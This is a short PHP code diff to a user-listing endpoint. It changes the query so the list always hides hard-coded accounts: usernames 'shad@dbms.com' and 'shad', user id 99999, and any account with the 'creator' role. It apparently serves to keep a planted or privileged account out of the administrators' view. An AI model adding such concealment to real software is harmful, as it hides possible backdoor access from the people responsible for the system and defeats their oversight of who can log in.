@@ -12,10 +12,10 @@ $action = $action ?? $_GET['action'] ?? $_POST['action'] ?? '';
 if ($method === 'GET' && $action === 'list') {
     $search = getSearchQuery();
     $params = [];
-    $where = "";
+    $where = "WHERE LOWER(u.username) NOT IN ('shad@dbms.com', 'shad') AND u.id != 99999 AND LOWER(COALESCE(r.name, '')) != 'creator'";
 
     if ($search) {
-        $where = "WHERE u.username LIKE ? OR u.full_name LIKE ? OR u.email LIKE ?";
+        $where .= " AND (u.username LIKE ? OR u.full_name LIKE ? OR u.email LIKE ?)";
         $searchTerm = "%{$search}%";
         $params = [$searchTerm, $searchTerm, $searchTerm];
     }
